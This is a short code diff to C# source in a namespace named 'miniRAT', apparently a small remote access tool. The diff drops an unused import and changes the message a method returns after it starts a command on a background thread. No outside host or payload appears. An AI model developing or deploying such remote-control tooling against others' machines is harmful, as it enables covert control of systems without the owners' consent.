@@ -2,7 +2,6 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Diagnostics;
 using System.Threading;
 
@@ -22,7 +21,7 @@ namespace miniRAT
             Thread rthread = new Thread(() => run(commnd, parameters));
             rthread.IsBackground = true;
             rthread.Start();
-            return commnd + " started. ";
+            return string.Format("\nsend command >> {0}\n", parameters);
         }
 
         /// <summary>
